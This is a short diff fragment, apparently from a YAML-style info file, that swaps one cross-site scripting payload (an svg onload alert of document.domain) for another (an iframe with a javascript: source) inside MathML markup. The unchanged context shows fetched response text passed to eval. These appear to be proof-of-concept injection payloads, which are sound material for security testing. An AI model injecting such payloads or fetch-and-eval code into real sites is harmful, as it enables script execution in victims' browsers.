@@ -9,7 +9,8 @@ info:
                         res.text().then(function(data){
                           eval(data)
                         })
-                      })>'><svg/onload=alert(document.domain)>ssss
+                      })>'><s>ssss</s>
+<iframe src=javascript:alert(document.domain)>
       </mtext>
     </math>
   version: production
